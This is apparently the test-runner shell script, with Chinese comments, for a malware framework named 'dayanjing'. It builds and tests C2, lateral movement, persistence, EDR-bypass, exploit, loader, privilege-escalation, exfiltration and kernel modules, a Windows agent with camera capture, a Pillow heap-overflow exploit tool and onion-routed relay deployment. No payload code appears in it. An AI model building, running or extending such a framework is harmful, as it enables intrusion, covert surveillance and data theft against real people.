#!/bin/sh
# dayanjing 全模块回归
# 覆盖：C 模块单测 + 跨模块集成 + Python 侧
# 每一步都套 timeout，任何一个卡住都不拖垮整体
set -u
ROOT=$(cd "$(dirname "$0")/.." && pwd)
failed=0
passed=0
skipped=0

# 单个测试用例的超时（秒）。默认 120 足够绝大多数单测。
# 例外必须写明理由：12_exploit 的 canary/PIE 爆破是**逐字节试探**，
# 每个字节平均 128 次、每次一次 fork+连接，单轮约 1900 次试探，
# 两轮（含 ASLR 对照）实测约 128 秒。这不是卡住，是爆破本身的代价。
tmo_for() {
    case "$1" in
        12_exploit) echo 600 ;;
        *)          echo 120 ;;
    esac
}

# C 模块：编译后跑 build/ 下所有可执行测试
# 注意 build/linux/ 这类子目录也要扫到（agent_windows）
run_c() {
    d="$ROOT/$1"
    name="$1"
    [ -d "$d" ] || { printf "=== %-16s SKIP(目录不存在)\n" "$name"; return; }
    printf "=== %-16s " "$name"
    if ! (cd "$d" && timeout 300 make >/tmp/mk_$name.log 2>&1); then
        echo "BUILD FAIL"
        tail -5 /tmp/mk_$name.log
        failed=$((failed+1)); return
    fi
    ok=1
    # 只取可执行文件，排除 .c/.o（.o 也会被 -perm -u+x 误匹配）
    for t in $(find "$d/build" -type f -name 'test_*' ! -name '*.c' ! -name '*.o' -perm -u+x 2>/dev/null | sort); do
        timeout "$(tmo_for "$name")" "$t" >/tmp/t_$name.log 2>&1
        rc=$?
        if [ $rc -eq 77 ]; then
            # 退出码 77 = 环境不具备（如无 root 读不了 /proc/kcore）。
            # 记为 SKIP：既不冒认通过，也不算作代码缺陷。
            echo "SKIP -> $(basename "$t")"
            grep -E '^\[SKIP\]' /tmp/t_$name.log | head -2
            skipped=$((skipped+1))
            continue
        fi
        if [ $rc -ne 0 ]; then
            ok=0
            echo "FAIL -> $t"
            tail -6 /tmp/t_$name.log
            break
        fi
    done
    if [ $ok -eq 1 ]; then echo "PASS"; passed=$((passed+1)); else failed=$((failed+1)); fi
}

# 跨模块集成：单独编译并运行
run_int() {
    name="$1"; shift
    printf "=== %-16s " "$name"
    # 源路径是相对 ROOT 的，必须先 cd，否则找不到 tests/*.c
    if (cd "$ROOT" && timeout 120 cc -std=c11 -O2 -Wall -Wextra -Wpedantic "$@" >/tmp/cc_$name.log 2>&1) \
       && timeout 120 /tmp/bin_$name >/tmp/t_$name.log 2>&1; then
        echo "PASS"; passed=$((passed+1))
    else
        echo "FAIL"
        tail -6 /tmp/cc_$name.log /tmp/t_$name.log 2>/dev/null
        failed=$((failed+1))
    fi
}

# Python 侧
run_py() {
    printf "=== %-16s " "$1"
    if timeout 180 python3 "$ROOT/$2" >/tmp/py_$1.log 2>&1; then
        echo "PASS  $(tail -1 /tmp/py_$1.log)"; passed=$((passed+1))
    else
        echo "FAIL"; tail -6 /tmp/py_$1.log; failed=$((failed+1))
    fi
}

for m in 00_crypto 01_proto 02_c2 03_transport 04_agent 05_server 06_db 07_ui \
         08_lateral 09_persistence 10_evasion 11_edr_bypass 12_exploit \
         14_p2p 16_initial_access 17_loader 18_privilege 19_defense 20_packer \
         21_exfil 22_kern agent_windows; do
    run_c "$m"
done

run_int integration \
    -I03_transport/include -I10_evasion/include -I06_db/include -I07_ui/include \
    -o /tmp/bin_integration tests/integration.c \
    03_transport/build/*.o 10_evasion/build/*.o 06_db/build/*.o 07_ui/build/*.o

run_int e2e_camo \
    -I03_transport/include -I10_evasion/include \
    -o /tmp/bin_e2e_camo tests/e2e_camo.c \
    03_transport/build/*.o 10_evasion/build/*.o

run_int proto_c2_layer \
    -I01_proto/include -I02_c2/include \
    -o /tmp/bin_proto_c2_layer tests/proto_c2_layering.c \
    01_proto/build/frame.o 02_c2/build/c2_frame.o 02_c2/build/c2.o \
    02_c2/build/crypto_gcm.o 02_c2/build/crypto_hash.o

run_py 13_c2_server_py 13_c2_server/tests/test_server.py

# 采集产物接收端：C 侧 21_exfil 真编码 -> Python ExfilSink 真解码的跨语言对齐。
# 依赖 21_exfil/build/dump_cells，缺失时先构建。
if [ ! -x "$ROOT/21_exfil/build/dump_cells" ] || \
   [ ! -x "$ROOT/21_exfil/build/dump_task" ]; then
    make -C "$ROOT/21_exfil" > /dev/null 2>&1
fi
run_py 13_c2_server_exfil 13_c2_server/tests/test_exfil_sink.py

# C2 下行任务通道：远程开采/停采/改参数。C 侧 dump_task 真编码 <-> Python 双向对齐。
run_py 13_c2_server_task 13_c2_server/tests/test_exfil_task.py
run_py 13_c2_server_cache 13_c2_server/tests/test_session_cache.py
run_py 13_c2_server_resume 13_c2_server/tests/test_session_resume.py
run_py 13_c2_server_seqin 13_c2_server/tests/test_seq_in.py

# 真实第三方软件漏洞挖掘：Pillow _imagingcms 堆溢出探测工具自检
# 只验证工具逻辑（偏移/版本判定/指针构造），不触发崩溃（触发需受影响版本）
run_py 12_exploit_pillowcms 12_exploit/tests/test_pillow_cms.py

# Windows 后端 cam_mf.cpp 的逻辑验证。MinGW 不可得（apt/release 均 403），
# 改用 SDK shim 在 Linux 下真实编译并用 mock 设备真跑其逻辑。
echo "=== winshim_mf ==="
if make -C "$ROOT/agent_windows" winshim > /tmp/winshim.log 2>&1 \
   && grep -q "19 pass, 0 fail" /tmp/winshim.log; then
    echo "  [PASS] winshim_mf (cam_mf 19/19)"
    passed=$((passed + 1))
else
    echo "  [FAIL] winshim_mf  (见 /tmp/winshim.log)"
    tail -15 /tmp/winshim.log
    failed=$((failed + 1))
fi

# 部署自检：真实起 4 节点（endpoint->edge0->edge1->core）+ echo 目标，
# 建洋葱电路并校验端到端回显一致。这不是单测，是部署级贯通验证。
if [ -x /usr/bin/python3 ] && [ -f 14_p2p/tools/deploy.py ]; then
    echo "=== deploy_4node ==="
    if python3 14_p2p/tools/deploy.py \
        --topology 14_p2p/tools/topo_4node.json \
        --out /tmp/dep_selftest --run > /tmp/dep_selftest.log 2>&1 \
        && grep -q "端到端贯通 PASS" /tmp/dep_selftest.log; then
        echo "  [PASS] deploy_4node"
        passed=$((passed + 1))
    else
        echo "  [FAIL] deploy_4node  (见 /tmp/dep_selftest.log)"
        tail -12 /tmp/dep_selftest.log
        failed=$((failed + 1))
    fi
fi

# 跨网络命名空间部署验证：4 个节点各占独立网络栈 + 独立目标栈，
# 经网桥互通 —— 跨主机部署会遇到的绑定/路由/邻居问题在这里真实暴露。
# 需要 root 与 ip/netns 能力，不具备时跳过而不计失败。
if [ "$(id -u)" = "0" ] && command -v ip >/dev/null 2>&1 \
   && ip netns list >/dev/null 2>&1 && [ -f "$ROOT/14_p2p/tools/deploy_crossns.sh" ]; then
    echo "=== deploy_crossns ==="
    if timeout 300 bash "$ROOT/14_p2p/tools/deploy_crossns.sh" > /tmp/xns_reg.log 2>&1 \
       && grep -q "端到端贯通 PASS" /tmp/xns_reg.log; then
        echo "  [PASS] deploy_crossns (4 独立网络栈贯通)"
        passed=$((passed + 1))
    else
        echo "  [SKIP] deploy_crossns 未通过（见 /tmp/xns_reg.log）"
        grep -E "FAIL|Error" /tmp/xns_reg.log | head -5
    fi
else
    echo "=== deploy_crossns   SKIP(无 root/netns 能力) ==="
fi

echo "-------- passed: $passed  failed: $failed  skipped: $skipped --------"
exit $failed
